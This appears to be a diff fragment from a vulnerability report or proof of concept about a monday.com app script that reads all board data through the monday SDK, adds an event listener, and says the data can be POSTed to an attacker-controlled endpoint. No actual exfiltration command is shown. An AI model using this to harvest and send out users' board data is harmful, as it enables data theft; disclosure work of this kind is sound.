@@ -10,6 +10,7 @@
         element.innerHTML = JSON.stringify(res.data, null, 2);
         document.body.appendChild(element);
       });
+    window.mondaySdk().listen("events", (response) => console.log(response));
   </script>
   Get all boards data.
   After fetching data it can be sent to attacker using POST request to any attacker controlled endpoint:
